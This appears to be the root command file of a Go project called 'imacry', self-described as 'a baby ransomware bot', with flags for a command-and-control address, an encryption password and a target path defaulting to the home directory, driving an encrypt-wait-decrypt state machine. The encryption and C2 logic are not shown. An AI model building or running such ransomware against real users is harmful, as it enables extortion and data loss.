package cmd

import (
	"os"

	"github.com/apex/log"
	"github.com/spf13/cobra"

	"github.com/spf13/viper"

	"github.com/prairir/imacry/pkg/config"
	"github.com/prairir/imacry/pkg/state"
)

// rootCmd represents the base command when called without any subcommands
var rootCmd = &cobra.Command{
	Use:   "imacry",
	Short: "a baby ransomware bot",
	Long:  `this is different`,
	Run:   RunImacry,
}

// Execute adds all child commands to the root command and sets flags appropriately.
// This is called by main.main(). It only needs to happen once to the rootCmd.
func Execute() {
	cobra.CheckErr(rootCmd.Execute())
}

func init() {
	cobra.OnInitialize(initConfig)

	pflags := rootCmd.PersistentFlags()
	// Here you will define your flags and configuration settings.
	// Cobra supports persistent flags, which, if defined here,
	// will be global for your application.
	pflags.StringP("cc-address", "a", "", "command and control server address")
	viper.BindPFlag("cc-address", pflags.Lookup("cc-address"))

	pflags.StringP("password", "p", "", "encryption/decryption password. Length must be at least 16 + 8n where n is some number over 0")
	viper.BindPFlag("password", pflags.Lookup("password"))

	pflags.StringP("base", "b", "", "base path to start encrypting")
	viper.BindPFlag("base", pflags.Lookup("base"))

}

// initConfig reads in config file and ENV variables if set.
func initConfig() {
	// if base is empty, get the home directory
	if viper.GetString("base") == "" {
		home, err := os.UserHomeDir()
		cobra.CheckErr(err)
		viper.Set("base", home)
	}

	if viper.GetString("password") != "" && len(viper.GetString("password"))-16 < 1 {
		log.Fatalf("Password is length: %d .It requires length 16 + 8n where n is over 0", len(config.Config.Password))
	}

	err := config.UnmarshalConfig()
	if err != nil {
		log.Fatalf("Couldnt unmarshal config: %s", err)
	}
}

func RunImacry(cmd *cobra.Command, args []string) {

	// state machine loop
	for {
		switch config.Config.State {
		case config.InitState:
			log.Info("Initializing")
			err := state.Init(config.EncryptState)
			if err != nil {
				log.Fatalf("Fatal error: %s", err)
			}
		case config.EncryptState:
			log.Infof("Encrypting, starting at %s", config.Config.Base)
			err := state.Encrypt(config.WaitState)
			if err != nil {
				log.Fatalf("Fatal error: %s", err)
			}
		case config.WaitState:
			log.Info("Waiting")
			err := state.Wait(config.DecryptState)
			if err != nil {
				log.Fatalf("Fatal error: %s", err)
			}
		case config.DecryptState:
			log.Infof("Decrypting, starting at %s", config.Config.Base)
			err := state.Decrypt(config.ExitState)
			if err != nil {
				log.Fatalf("Fatal error: %s", err)
			}
		case config.ExitState:
			err := state.Exit()
			if err != nil {
				log.Fatalf("Fatal error: %s", err)
			}
			log.Info("Finished, have a good day :)")
			return
		default:
			log.Fatal("Machine in invalid state")
		}
	}
}
